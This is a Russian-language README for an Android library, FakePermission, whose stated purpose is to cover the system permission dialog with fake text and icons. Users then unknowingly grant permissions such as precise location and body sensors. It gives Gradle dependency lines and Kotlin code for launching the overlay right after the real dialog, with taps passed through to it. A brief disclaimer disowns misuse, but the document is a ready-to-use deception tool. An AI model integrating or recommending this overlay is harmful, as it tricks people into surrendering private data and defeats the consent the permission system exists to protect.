# FakePermission
Android Fake Permission Tool

Библиотека предоставляет возможность перекрывать системный диалог выдачи разрешений начиная с Android 6.0, подменяя текст и иконку на тот, что вам нужно. Таким образом вы можете незаметно для конечного пользователя выдавать вашему приложению те разрешения, которые вам нужны, вводя пользователя в заблуждение.

### Библиотека предоставляется как есть, и не призывает никого к использованию в подобных целях

# Демонстрация работы библиотеки
![](Sample.gif)

# Подключение

Добавьте зависимость в build.gradle проекта

    repositories {
        maven { url "https://dl.bintray.com/vittach/FakePermission" }
        ...
    }

А также добавть в build.gradle модуля вашего приложения

    implementation 'com.vittach:fakepermission:1.0.0@aar'

# Настройка и пример использования

Для активации библиотеки необходимо вызвать ее активити PermissionActivity и передать нужные конфигурационные параметры сразу строго ПОСЛЕ вызова системного диалога на выдачу пермишенов.

Если вы используете сторонние библиотеки для вызова системного диалога, как например такую на базе корутин

    com.sagar:coroutinespermission:1.0.0

То необходимо убедиться, что корутина, в которой она будет вызываться имеет диспетчер immediate, например Dispatchers.Main.immediate.

Порядок появления диалогов очень важен, т.к. FakePermission по своей сути просто перекрывает системный диалог, позволяет прокидывать click эвенты

    startActivity(
        Intent(this, PermissionActivity::class.java)
            .apply {
                putExtra(PORTRAIT_BOTTOM_MARGINS, portraitBottomMargins)
                putExtra(PORTRAIT_SIDE_MARGINS, portraitSideMargins)
                putExtra(LAND_BOTTOM_MARGINS, landBottomMargins)
                putExtra(LAND_SIDE_MARGINS, landSideMargins)
                putExtra(ORIGIN_PERMISSIONS, originPermissions)
                putExtra(FAKE_PERMISSIONS, fakePermissions)
                putExtra(FAKE_ICONS, fakeIcons)
            }
    )
    
#### Обязательные конфигурационные параметры:
- originPermissions

        val originPermissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.BODY_SENSORS,
            ...
        )

- fakePermissions

        val fakePermissions = arrayOf(
            getString(R.string.permission_fine_location_fake),
            getString(R.string.permission_body_sensors_fake),
            ...
        )

 #### Необязательные конфигурационные параметры:
 - portraitBottomMargins

        val portraitBottomMargins = arrayOf(
            100f.pxFromDp(this),
            65f.pxFromDp(this),
            ...
        }

 - portraitSideMargins
 - landBottomMargins
 - landSideMargins
 - fakeIcons

        val fakeIcons = arrayOf(
            R.drawable.ic_location,
            R.drawable.ic_anchor,
            ...
        )
